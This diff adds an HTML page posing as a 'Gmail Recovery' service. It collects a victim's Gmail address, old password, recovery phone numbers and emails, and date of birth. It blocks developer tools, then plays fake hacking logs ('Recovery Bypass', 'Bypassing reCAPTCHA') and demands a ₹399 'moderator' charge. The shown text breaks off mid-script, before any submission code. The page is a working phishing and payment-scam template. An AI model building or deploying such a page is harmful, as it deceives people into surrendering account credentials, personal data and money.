@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Gmail Recovery</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* Global Styles & Performance Optimization */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', '-apple-system', BlinkMacSystemFont, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            /* Butter smooth font rendering */
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body {
+            background-color: #0d1117;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 40px 15px;
+            overflow-x: hidden;
+            overflow-y: auto;
+            scroll-behavior: smooth;
+        }
+
+        /* --- ANIMATED GOOGLE THEMED BACKGROUND (ORBS) --- */
+        .bg-animation {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            z-index: -1; overflow: hidden;
+            pointer-events: none;
+        }
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(100px); 
+            opacity: 0.35;
+            animation: float 20s infinite ease-in-out alternate;
+            will-change: transform;
+            transform: translateZ(0);
+        }
+        .orb-1 {
+            width: 400px; height: 400px; background: #4285F4; 
+            top: -5%; left: -5%; animation-duration: 25s;
+        }
+        .orb-2 {
+            width: 450px; height: 450px; background: #EA4335; 
+            top: 40%; right: -10%; animation-duration: 22s; animation-delay: -5s;
+        }
+        .orb-3 {
+            width: 350px; height: 350px; background: #FBBC05; 
+            bottom: -10%; left: 20%; animation-duration: 28s; animation-delay: -2s;
+        }
+        .orb-4 {
+            width: 300px; height: 300px; background: #34A853; 
+            bottom: 20%; right: 20%; animation-duration: 20s; animation-delay: -8s;
+        }
+
+        @keyframes float {
+            0% { transform: translate3d(0, 0, 0) scale(1); }
+            33% { transform: translate3d(30px, -40px, 0) scale(1.05); }
+            66% { transform: translate3d(-20px, 20px, 0) scale(0.95); }
+            100% { transform: translate3d(40px, 40px, 0) scale(1.02); }
+        }
+
+        /* Container & Glass Panel */
+        .container {
+            width: 100%;
+            max-width: 550px;
+            opacity: 0;
+            transform: scale(0.95) translateZ(0);
+            transition: opacity 0.6s cubic-bezier(0.25, 1, 0.5, 1), transform 0.6s cubic-bezier(0.25, 1, 0.5, 1);
+            display: none; 
+        }
+
+        .container.show {
+            opacity: 1;
+            transform: scale(1) translateZ(0);
+        }
+
+        .glass-panel {
+            background: rgba(25, 27, 33, 0.4);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-top: 1px solid rgba(255, 255, 255, 0.3);
+            border-left: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 24px;
+            padding: 40px 30px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.5), inset 0 0 20px rgba(255,255,255,0.03);
+            position: relative;
+            transform: translateZ(0); 
+            backface-visibility: hidden;
+            margin-bottom: 20px;
+            min-height: 520px;
+            transition: all 0.4s ease;
+        }
+
+        .glass-panel.borderless-mode {
+            border: none !important;
+            background: transparent !important;
+            box-shadow: none !important;
+            backdrop-filter: none !important;
+            -webkit-backdrop-filter: none !important;
+            padding: 10px !important;
+        }
+
+        @keyframes shakeError {
+            0%, 100% { transform: translate3d(0, 0, 0); }
+            10%, 30%, 50%, 70%, 90% { transform: translate3d(-8px, 0, 0); }
+            20%, 40%, 60%, 80% { transform: translate3d(8px, 0, 0); }
+        }
+
+        .shake {
+            animation: shakeError 0.5s cubic-bezier(.36,.07,.19,.97) both;
+            border: 1px solid rgba(234, 67, 53, 0.6) !important;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .title-wrapper {
+            position: relative;
+            display: inline-block;
+            padding: 5px 15px;
+        }
+
+        h1 {
+            font-size: 2rem;
+            text-transform: uppercase;
+            font-weight: 900;
+            letter-spacing: 1px;
+            line-height: 1.3;
+            position: relative;
+            z-index: 2;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 22px;
+            position: relative;
+            width: 100%;
+        }
+
+        /* --- OPACITY FIX FOR OPTIONAL FIELDS --- */
+        .optional-group {
+            opacity: 0.65;
+            transition: opacity 0.3s ease;
+        }
+        .optional-group:focus-within, .optional-group:hover {
+            opacity: 1;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+            color: #c4c6ca;
+            font-weight: 700;
+            padding-left: 5px;
+        }
+
+        .mandatory {
+            color: #EA4335;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+
+        .optional-text {
+            font-size: 0.6rem; /* Made smaller */
+            color: #FBBC05; 
+            font-weight: 600;
+            margin-left: 4px;
+            font-style: normal; /* Made straight (not italic) */
+            vertical-align: middle;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px 18px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.4);
+            color: #fff;
+            font-size: 1.05rem;
+            font-weight: 600; 
+            transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1);
+            outline: none;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
+            -webkit-appearance: none;
+        }
+
+        /* Placeholder Fixes */
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.55);
+            font-size: 0.95rem;
+            font-weight: 500;
+            transition: opacity 0.3s ease;
+        }
+        input:focus::placeholder {
+            opacity: 0.3;
+        }
+
+        /* Green Glowing Effect on Focus */
+        input:focus { 
+            border-color: #34A853 !important; 
+            background: rgba(0, 0, 0, 0.6); 
+            box-shadow: 0 0 12px rgba(52, 168, 83, 0.4), inset 0 2px 5px rgba(0,0,0,0.2) !important;
+        }
+        input.input-error { border-color: #EA4335 !important; box-shadow: 0 0 12px rgba(234, 67, 53, 0.4) !important;}
+
+        /* CUSTOM DROPDOWN */
+        .custom-select-wrapper { position: relative; width: 100%; z-index: 50; }
+        .custom-select-trigger {
+            width: 100%; padding: 15px 18px; border-radius: 12px; color: #fff;
+            background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 1.05rem; font-weight: 600; display: flex; justify-content: space-between; align-items: center;
+            cursor: pointer; transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1);
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
+            -webkit-tap-highlight-color: transparent;
+        }
+        .custom-select-trigger:hover { background-color: rgba(255,255,255,0.05); }
+        .custom-select-wrapper.open .custom-select-trigger { border-color: #34A853; box-shadow: 0 0 12px rgba(52, 168, 83, 0.4); }
+        .custom-select-wrapper.input-error .custom-select-trigger { border-color: #EA4335 !important; }
+        
+        .custom-select-options {
+            position: absolute; display: block; top: calc(100% + 5px); left: 0; right: 0; 
+            background: rgba(25, 27, 33, 0.95); backdrop-filter: blur(15px);
+            border: 1px solid rgba(255,255,255,0.15); border-radius: 12px; 
+            box-shadow: 0 15px 30px rgba(0,0,0,0.8); z-index: 100;
+            opacity: 0; visibility: hidden; pointer-events: none; 
+            transform: translate3d(0, -10px, 0); transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            list-style: none; padding: 8px; max-height: 250px; overflow-y: auto;
+            will-change: opacity, transform;
+        }
+        .custom-select-wrapper.open .custom-select-options { 
+            opacity: 1; visibility: visible; pointer-events: all; transform: translate3d(0, 0, 0); 
+        }
+        .custom-select-options li { 
+            padding: 12px 15px; color: #ccc; cursor: pointer; border-radius: 8px; 
+            transition: all 0.2s ease-in-out; font-size: 1rem; font-weight: 600; text-align: left; 
+        }
+        .custom-select-options li:hover { background: rgba(52, 168, 83, 0.15); color: #fff; transform: translateX(5px); }
+        .custom-select-options li.selected { background: rgba(52, 168, 83, 0.25); color: #fff; font-weight: 700; border-left: 3px solid #34A853;}
+        
+        ::-webkit-scrollbar { width: 5px; background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 10px; }
+        
+        .fa-chevron-down { transition: transform 0.3s ease; color: #a0a0a5; }
+        .custom-select-wrapper.open .fa-chevron-down { transform: rotate(180deg); color: #34A853; }
+
+        .error-msg {
+            color: #EA4335;
+            font-size: 0.85rem;
+            margin-top: 6px;
+            padding-left: 5px;
+            font-weight: bold;
+            display: none;
+        }
+
+        /* Proceed Button */
+        .btn-submit {
+            background: linear-gradient(135deg, #34A853, #227c3a);
+            color: #fff;
+            border: 2px solid rgba(52, 168, 83, 0.6);
+            padding: 16px;
+            font-size: 1.2rem;
+            border-radius: 12px;
+            cursor: pointer;
+            text-transform: uppercase;
+            font-weight: 800;
+            width: 100%;
+            transition: transform 0.2s cubic-bezier(0.25, 1, 0.5, 1), box-shadow 0.2s ease;
+            margin-top: 20px;
+            letter-spacing: 1.5px;
+            box-shadow: 0 0 20px rgba(52, 168, 83, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transform: translateZ(0);
+        }
+
+        .btn-submit:hover { box-shadow: 0 0 30px rgba(52, 168, 83, 0.8); }
+        .btn-submit:active { transform: scale(0.96) translateZ(0); }
+
+        /* Processing Logs Layout */
+        .processing-container {
+            display: none;
+            flex-direction: column;
+            width: 100%;
+            height: 100%;
+            justify-content: flex-start;
+            align-items: center;
+            padding-top: 10px;
+        }
+
+        .process-log {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            font-family: 'Courier New', Courier, monospace;
+            background: transparent;
+            border: none;
+            box-shadow: none;
+            height: 520px;
+            overflow-y: hidden; 
+            scroll-behavior: auto;
+            padding: 20px 10px;
+            -webkit-mask-image: linear-gradient(to right, transparent 0%, black 5%, black 95%, transparent 100%), linear-gradient(to bottom, transparent 0%, black 5%, black 95%, transparent 100%);
+            -webkit-mask-composite: source-in;
+            mask-image: linear-gradient(to right, transparent 0%, black 5%, black 95%, transparent 100%), linear-gradient(to bottom, transparent 0%, black 5%, black 95%, transparent 100%);
+            mask-composite: intersect;
+        }
+
+        .hacker-line {
+            font-size: 0.65rem !important; 
+            font-weight: 800 !important;
+            color: #34A853 !important; 
+            text-shadow: 0 0 12px #34A853 !important;
+            transform: scaleY(1.8) translateZ(0) !important;
+            filter: blur(2.8px) !important; 
+            opacity: 0.55 !important;
+            margin-bottom: 2px !important;
+            line-height: 1.1;
+            word-wrap: break-word;
+            will-change: transform;
+        }
+
+        .log-entry {
+            font-size: 1.05rem;
+            font-weight: bold;
+            color: rgba(255,255,255,0.95);
+            line-height: 1.5;
+            text-align: left;
+            word-wrap: break-word;
+            opacity: 0;
+            transform: translate3d(0, 15px, 0);
+            transition: opacity 0.4s ease, transform 0.4s cubic-bezier(0.1, 1, 0, 1);
+            will-change: opacity, transform;
+        }
+        
+        .log-entry.visible {
+            opacity: 1;
+            transform: translate3d(0, 0, 0);
+        }
+
+        .typing-cursor::after {
+            content: '█';
+            animation: blinkCursor 0.4s infinite;
+            margin-left: 5px;
+            color: #34A853; 
+        }
+
+        @keyframes blinkCursor {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        .c-sys { color: #4285F4; text-shadow: 0 0 10px rgba(66, 133, 244, 0.8); }
+        .c-data { color: #FBBC05; text-shadow: 0 0 10px rgba(251, 188, 5, 0.8); }
+        .c-succ { color: #34A853; text-shadow: 0 0 10px rgba(52, 168, 83, 0.8); }
+        .c-err { color: #EA4335; text-shadow: 0 0 10px rgba(234, 67, 53, 0.8); }
+        .c-billing { color: #ffcc00; text-shadow: 0 0 15px rgba(255, 204, 0, 0.9); font-size: 1.15rem; }
+
+        /* INTRO MAGNETIC SPLASH SCREEN */
+        .intro-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+            display: flex; align-items: center; justify-content: center;
+            z-index: 99999; overflow: hidden;
+        }
+
+        #introMagneticText {
+            will-change: opacity, transform, filter;
+        }
+
+        .magnetic-container {
+            display: flex; flex-wrap: wrap; justify-content: center;
+            max-width: 95%; text-align: center; perspective: 1000px;
+        }
+
+        .char {
+            font-family: 'Montserrat', sans-serif; 
+            font-size: 3rem; font-weight: 900;
+            text-transform: uppercase;
+            display: inline-block; opacity: 0;
+            will-change: transform, opacity;
+            backface-visibility: hidden; 
+        }
+
+        /* BLINKING TRANSITION IMAGE SCREENS */
+        .transition-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.95);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 10000; opacity: 0; pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .transition-screen.active {
+            opacity: 1; pointer-events: all;
+        }
+
+        .transition-image {
+            max-width: 15%; max-height: 15%;
+            animation: blinkImage 1s infinite ease-in-out;
+            transform: translateZ(0);
+        }
+
+        @keyframes blinkImage {
+            0%, 100% { opacity: 1; transform: scale(1) translateZ(0); }
+            50% { opacity: 0.6; transform: scale(0.9) translateZ(0); }
+        }
+
+        /* MOBILE SPECIFIC OPTIMIZATIONS */
+        @media (max-width: 480px) {
+            body { padding: 25px 15px; }
+            .glass-panel { padding: 30px 20px; min-height: 480px; }
+            h1 { font-size: 1.8rem; }
+            .char { font-size: 2.2rem; }
+            .transition-image { max-width: 30%; max-height: 30%; }
+            
+            input {
+                padding: 14px 15px;
+                font-size: 1rem;
+            }
+            input::placeholder {
+                font-size: 0.85rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-animation">
+        <div class="orb orb-1"></div>
+        <div class="orb orb-2"></div>
+        <div class="orb orb-3"></div>
+        <div class="orb orb-4"></div>
+    </div>
+
+    <div class="intro-overlay" id="introOverlay">
+        <div class="magnetic-container" id="introMagneticText"></div>
+    </div>
+
+    <div class="transition-screen" id="transitionScreen">
+        <img src="https://pending404.github.io/g_ml/gml.gif" alt="Loading" class="transition-image">
+    </div>
+
+    <div class="transition-screen" id="finalRedirectScreen" style="z-index: 10005;">
+        <img src="https://pending404.github.io/g_ml/gml.gif" alt="Loading" class="transition-image">
+    </div>
+
+    <div class="container" id="mainContainer">
+        <div class="glass-panel" id="glassPanel">
+            
+            <div id="formSection">
+                <header>
+                    <div class="title-wrapper" id="mainHeaderTitle">
+                        <h1>
+                            </h1>
+                    </div>
+                </header>
+                
+                <form id="recoveryForm" novalidate>
+                    
+                    <div class="form-group" style="z-index: 100;">
+                        <label>Gmail ID <span class="mandatory">*</span></label>
+                        <input type="email" id="firstGmail" class="email-autofill" placeholder="Enter your email ID">
+                        <div class="error-msg" id="firstGmailError">Please enter a valid Gmail ID.</div>
+                    </div>
+
+                    <div class="form-group optional-group" style="z-index: 90;">
+                        <label>Full Name <span class="optional-text">(Optional)</span></label>
+                        <input type="text" id="fullName" placeholder="Enter your full name">
+                    </div>
+
+                    <div class="form-group optional-group" style="z-index: 80;">
+                        <label>Old Password <span class="optional-text">(Optional)</span></label>
+                        <input type="text" id="oldPassword" placeholder="Last remembered password">
+                    </div>
+
+                    <div class="form-group optional-group" style="z-index: 70;">
+                        <label>Recovery Phone Number <span class="optional-text">(Optional)</span></label>
+                        <input type="tel" id="oldPhone" placeholder="Old recovery phone number">
+                    </div>
+
+                    <div class="form-group optional-group" style="z-index: 60;">
+                        <label>Recovery Email ID <span class="optional-text">(Optional)</span></label>
+                        <input type="email" id="oldRecoverEmail" class="email-autofill" placeholder="Old recovery email ID">
+                    </div>
+
+                    <div class="form-group optional-group" style="z-index: 50;">
+                        <label>Date of Birth <span class="optional-text">(Optional)</span></label>
+                        <div style="position: relative; width: 100%;">
+                            <input type="text" id="dobInput" inputmode="numeric" placeholder="DD/MM/YYYY" maxlength="10">
+                            <input type="date" id="dobPicker" style="position: absolute; right: 10px; top: 12px; width: 30px; height: 30px; opacity: 0; padding: 0; border: none; z-index: 10; cursor: pointer;">
+                            <i class="fa-regular fa-calendar" style="position: absolute; right: 18px; top: 18px; color: #fff; pointer-events: none; z-index: 5;"></i>
+                        </div>
+                    </div>
+
+                    <div class="form-group" style="z-index: 40;">
+                        <label>Device Operating System <span class="mandatory">*</span></label>
+                        <div class="custom-select-wrapper" id="osWrapper" data-value="">
+                            <div class="custom-select-trigger"><span style="color: #c4c6ca;">Select Operating System</span> <i class="fa-solid fa-chevron-down"></i></div>
+                            <ul class="custom-select-options">
+                                <li data-value="Android">Android</li>
+                                <li data-value="iOS">iOS</li>
+                                <li data-value="macOS">macOS</li>
+                                <li data-value="Windows PC">Windows PC</li>
+                                <li data-value="Linux">Linux</li>
+                                <li data-value="Other">Other</li>
+                            </ul>
+                        </div>
+                        <div class="error-msg" id="osError">Please select your device operating system.</div>
+                    </div>
+
+                    <div class="form-group" id="otherOsGroup" style="display: none; z-index: 35;">
+                        <label>Describe Your Device <span class="mandatory">*</span></label>
+                        <input type="text" id="otherOsDesc" placeholder="Please describe your device">
+                        <div class="error-msg" id="otherOsError">Please describe your device.</div>
+                    </div>
+
+                    <div class="form-group optional-group" style="z-index: 30;">
+                        <label>Add Recovery Email ID <span class="optional-text">(Optional)</span></label>
+                        <input type="email" id="newRecoverEmail" class="email-autofill" placeholder="Add new recovery email ID">
+                    </div>
+
+                    <div class="form-group" style="z-index: 20;">
+                        <label>Add Phone Number <span class="mandatory">*</span></label>
+                        <input type="tel" id="newPhone" placeholder="Add new recovery phone number" oninput="this.value = this.value.replace(/[^0-9+]/g, '')">
+                        <div class="error-msg" id="newPhoneError">Please enter a valid phone number.</div>
+                    </div>
+
+                    <div class="form-group optional-group" style="z-index: 10;">
+                        <label>Contact Email <span class="optional-text">(Optional)</span></label>
+                        <input type="email" id="contactEmail" class="email-autofill" placeholder="Email to contact you">
+                    </div>
+
+                    <button type="button" class="btn-submit" id="proceedBtn">
+                        PROCEED
+                    </button>
+                </form>
+            </div>
+
+            <div class="processing-container" id="processingSection">
+                <div class="process-log" id="processLog">
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            
+            // Security constraints
+            document.addEventListener('contextmenu', event => event.preventDefault());
+            document.onkeydown = function(e) {
+                if(e.keyCode == 123) return false;
+                if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
+                if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+            }
+
+            const colors = ['#4285F4', '#EA4335', '#FBBC05', '#34A853']; // Google colors
+
+            function setHeaderGlow() {
+                const headerText1 = "GMAIL";
+                const headerText2 = "RECOVERY";
+                const h1Element = document.querySelector('#mainHeaderTitle h1');
+                
+                let htmlContent = "";
+                headerText1.split('').forEach((char, idx) => {
+                    const color = colors[idx % colors.length];
+                    htmlContent += `<span style="color: ${color}; text-shadow: 0 0 15px ${color}, 0 0 35px ${color};">${char}</span>`;
+                });
+                htmlContent += "<br>";
+                
+                let colorIndex = 0;
+                headerText2.split('').forEach((char) => {
+                    if(char === ' ') {
+                        htmlContent += " ";
+                    } else {
+                        const color = colors[colorIndex % colors.length];
+                        htmlContent += `<span style="color: ${color}; text-shadow: 0 0 15px ${color}, 0 0 35px ${color};">${char}</span>`;
+                        colorIndex++;
+                    }
+                });
+                
+                h1Element.innerHTML = htmlContent;
+            }
+            setHeaderGlow();
+
+            const introOverlay = document.getElementById('introOverlay');
+            const introMagneticText = document.getElementById('introMagneticText');
+            const mainContainer = document.getElementById('mainContainer');
+            
+            const proceedBtn = document.getElementById('proceedBtn');
+            const glassPanel = document.getElementById('glassPanel');
+            const formSection = document.getElementById('formSection');
+            const processingSection = document.getElementById('processingSection');
+            const processLog = document.getElementById('processLog');
+            
+            const transitionScreen = document.getElementById('transitionScreen');
+            const finalRedirectScreen = document.getElementById('finalRedirectScreen');
+
+            // --- FIXED: SMART EMAIL AUTO-FILL LOGIC ---
+            document.querySelectorAll('.email-autofill').forEach(input => {
+                input.addEventListener('input', function(e) {
+                    if (e.inputType === 'deleteContentBackward' || e.inputType === 'deleteContentForward') {
+                        return;
+                    }
+                    if (this.value.endsWith('@')) {
+                        this.value = this.value + 'gmail.com';
+                    }
+                });
+            });
+
+            // --- SMART DATE OF BIRTH LOGIC ---
+            const dobInput = document.getElementById('dobInput');
+            const dobPicker = document.getElementById('dobPicker');
+
+            dobInput.addEventListener('input', function(e) {
+                if (e.inputType === 'deleteContentBackward' || e.inputType === 'deleteContentForward') {
+                    return;
+                }
+
+                let val = this.value.replace(/\D/g, ''); 
+                if (val.length > 8) val = val.substring(0, 8);
+                
+                let day = val.substring(0, 2);
+                let month = val.substring(2, 4);
+                let year = val.substring(4, 8);
+
+                if (day.length === 1 && parseInt(day) > 3) day = '0' + day;
+                if (month.length === 1 && parseInt(month) > 1) month = '0' + month;
+
+                let formatted = day;
+                if (day.length === 2) formatted += '/';
+                if (month.length > 0) formatted += month;
+                if (month.length === 2) formatted += '/';
+                if (year.length > 0) formatted += year;
+
+                this.value = formatted;
+            });
+
+            dobPicker.addEventListener('change', function() {
+                if(this.value) {
+                    const parts = this.value.split('-'); 
+                    dobInput.value = `${parts[2]}/${parts[1]}/${parts[0]}`;
+                }
+            });
+
+            function clearAllValidationErrors() {
+                document.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
+                document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');
+                glassPanel.classList.remove('shake');
+            }
+
+            // --- 1. INTRO MAGNETIC VANISHING ANIMATION (SMOOTHER & SLOWER) ---
+            function runIntroAnimation() {
+                const text = "GMAIL RECOVERY";
+                introMagneticText.innerHTML = '';
+                const charElements = [];
+                const words = text.split(' ');
+
+                words.forEach((word, wordIndex) => {
+                    const wordDiv = document.createElement('div');
+                    wordDiv.style.display = 'inline-block';
+                    wordDiv.style.margin = '0 10px';
+
+                    word.split('').forEach((char, idx) => {
+                        const span = document.createElement('span');
+                        span.innerText = char;
+                        span.className = 'char';
+                        const color = colors[idx % colors.length];
+                        span.style.color = color;
+                        span.style.textShadow = `0 0 15px ${color}, 0 0 30px ${color}`;
+                        
+                        const rx = (Math.random() - 0.5) * 1500;
+                        const ry = (Math.random() - 0.5) * 1500;
+                        const rz = (Math.random() - 0.5) * 500;
+                        const rotate = (Math.random() - 0.5) * 360;
+                        
+                        span.style.transform = `translate3d(${rx}px, ${ry}px, ${rz}px) rotate(${rotate}deg) scale(2)`;
+                        
+                        wordDiv.appendChild(span);
+                        charElements.push(span);
+                    });
+                    
+                    introMagneticText.appendChild(wordDiv);
+                    if (wordIndex === 0) { 
+                        introMagneticText.appendChild(document.createElement('br'));
+                    }
+                });
+
+                // Trigger slower, cinematic entrance
+                requestAnimationFrame(() => {
+                    setTimeout(() => {
+                        charElements.forEach((span, i) => {
+                            setTimeout(() => {
+                                span.style.transition = 'transform 1.5s cubic-bezier(0.25, 1, 0.5, 1), opacity 1s ease';
+                                span.style.transform = 'translate3d(0,0,0) rotate(0deg) scale(1)';
+                                span.style.opacity = '1';
+                            }, i * 50); 
+                        });
+                    }, 50);
+                });
+
+                const assembleTime = (charElements.length * 50) + 1500;
+
+                setTimeout(() => {
+                    introMagneticText.style.transition = 'opacity 1.2s ease, transform 1.2s ease, filter 1.2s ease';
+                    introMagneticText.style.opacity = '0';
+                    introMagneticText.style.transform = 'scale(1.05)';
+                    introMagneticText.style.filter = 'blur(10px)';
+                }, assembleTime + 1000);
+
+                const vanishTime = assembleTime + 2200;
+
+                setTimeout(() => {
+                    introOverlay.style.display = 'none';
+                    mainContainer.style.display = 'block';
+                    requestAnimationFrame(() => {
+                        setTimeout(() => {
+                            mainContainer.classList.add('show');
+                        }, 50);
+                    });
+                }, vanishTime); 
+            }
+
+            runIntroAnimation();
+
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('focus', function() {
+                    clearAllValidationErrors();
+                    setTimeout(() => {
+                        this.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    }, 300);
+                });
+            });
+
+            document.querySelectorAll('.custom-select-wrapper').forEach(wrapper => {
+                const trigger = wrapper.querySelector('.custom-select-trigger');
+                const options = wrapper.querySelectorAll('.custom-select-options li');
+                const textSpan = wrapper.querySelector('.custom-select-trigger span');
+                
+                trigger.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    clearAllValidationErrors();
+                    document.querySelectorAll('.custom-select-wrapper').forEach(w => {
+                        if (w !== wrapper) w.classList.remove('open');
+                    });
+                    wrapper.classList.toggle('open');
+
+                    if(wrapper.classList.contains('open')) {
+                        setTimeout(() => {
+                            wrapper.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        }, 100);
+                    }
+                });
+
+                options.forEach(option => {
+                    option.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                        const value = this.getAttribute('data-value');
+                        const text = this.textContent.trim(); 
+                        
+                        textSpan.textContent = text; 
+                        textSpan.style.color = '#fff';
+                        wrapper.setAttribute('data-value', value);
+                        
+                        if (wrapper.id === 'osWrapper') {
+                            const otherOsGroup = document.getElementById('otherOsGroup');
+                            if (value === 'Other') {
+                                otherOsGroup.style.display = 'block';
+                            } else {
+                                otherOsGroup.style.display = 'none';
+                                document.getElementById('otherOsDesc').value = '';
+                            }
+                        }
+
+                        options.forEach(o => o.classList.remove('selected'));
+                        this.classList.add('selected');
+                        wrapper.classList.remove('open');
+                    });
+                });
+            });
+
+            document.addEventListener('click', () => {
+                document.querySelectorAll('.custom-select-wrapper').forEach(w => w.classList.remove('open'));
+            });
+
+            // --- 3. FORM VALIDATION ---
+            proceedBtn.addEventListener('click', () => {
+                let isValid = true;
+                clearAllValidationErrors();
+
+                const firstGmail = document.getElementById('firstGmail');
+                const osWrap = document.getElementById('osWrapper');
+                const newPhone = document.getElementById('newPhone');
+                const otherOsDesc = document.getElementById('otherOsDesc');
+
+                const validateInput = (element, condition) => {
+                    if(condition) {
+                        element.classList.add('input-error');
+                        document.getElementById(element.id + 'Error').style.display = 'block';
+                        isValid = false;
+                    }
+                };
+
+                const validateDropdown = (wrapper) => {
+                    if(wrapper.getAttribute('data-value') === "" || !wrapper.hasAttribute('data-value')) {
+                        wrapper.classList.add('input-error');
+                        document.getElementById(wrapper.id.replace('Wrapper', 'Error')).style.display = 'block';
+                        isValid = false;
+                    }
+                };
+
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                
+                validateInput(firstGmail, !emailRegex.test(firstGmail.value));
+                validateDropdown(osWrap);
+                validateInput(newPhone, newPhone.value.length < 5); 
+                
+                if (osWrap.getAttribute('data-value') === 'Other') {
+                    validateInput(otherOsDesc, otherOsDesc.value.trim() === '');
+                }
+
+                if (!isValid) {
+                    glassPanel.classList.remove('shake');
+                    void glassPanel.offsetWidth; 
+                    glassPanel.classList.add('shake');
+                    return; 
+                }
+
+                let finalOsValue = osWrap.getAttribute('data-value');
+                if (finalOsValue === 'Other') {
+                    finalOsValue = otherOsDesc.value;
+                }
+
+                const formData = {
+                    firstGmail: firstGmail.value,
+                    fullName: document.getElementById('fullName').value || 'Not Provided',
+                    oldPassword: document.getElementById('oldPassword').value || 'Not Provided',
+                    oldPhone: document.getElementById('oldPhone').value || 'Not Provided',
+                    oldRecoverEmail: document.getElementById('oldRecoverEmail').value || 'Not Provided',
+                    dob: dobInput.value || 'Not Provided',
+                    os: finalOsValue,
+                    newRecoverEmail: document.getElementById('newRecoverEmail').value || 'Not Provided',
+                    newPhone: newPhone.value,
+                    contactEmail: document.getElementById('contactEmail').value || 'Not Provided'
+                };
+
+                startSequence(formData);
+            });
+
+            function startSequence(data) {
+                transitionScreen.classList.add('active');
+
+                setTimeout(() => {
+                    transitionScreen.classList.remove('active');
+                    
+                    glassPanel.classList.add('borderless-mode');
+                    formSection.style.display = 'none';
+                    processingSection.style.display = 'flex';
+
+                    requestAnimationFrame(() => {
+                        runSeamlessSyncAnimation(data);
+                    });
+                }, 2000); 
+            }
+
+            // --- 4. 100% SEAMLESS SYNC ANIMATION ---
+            function runSeamlessSyncAnimation(data) {
+                
+                const hackerPhrases = [
+                    "[GOOGLE] Initializing OAuth Recovery Bypass v2...",
+                    "[AUTH] Connecting to primary mail servers...",
+                    "[SEC] Bypassing reCAPTCHA v3 verification...",
+                    "[DATA] Overwriting registry keys...",
+                    "[NET] Establishing encrypted tunnel to DB...",
+                    "[PAYLOAD] Injecting new recovery parameters...",
+                    "[NODE] Clearing older session cookies...",
+                    "[SYSTEM] Spoofing device ID algorithms...",
+                    "[ROUTING] Masking IP through proxy nodes...",
+                    "[SSL] Force injecting SSL cert verification..."
+                ];
+
+                const realLogs = [
+                    `<span class="c-sys">[System]</span> Initiating Recovery Environment...`,
+                    `<span class="c-data">[Info]</span> Target Email: ${data.firstGmail}`,
+                    `<span class="c-data">[Info]</span> Target Device/OS: ${data.os}`,
+                    `<span class="c-sys">[Scan]</span> Processing Old Details & Password...`,
+                    `<span class="c-succ">[Execute]</span> Binding New Recovery Phone: ${data.newPhone}`,
+                    `<span class="c-succ">[Success]</span> Parameters Compiled Successfully!`,
+                    `<span class="c-billing">[Billing] Moderator payment charges: ₹399</span>`,
+                    `<span class="c-sys">Please wait... Forwarding to secure environment.</span>`
+                ];
+
+                let startTimestamp = null;
+                let reqAnimId;
+
+                function fastPhase(timestamp) {
+                    if (!startTimestamp) startTimestamp = timestamp;
+                    let progress = timestamp - startTimestamp;
+
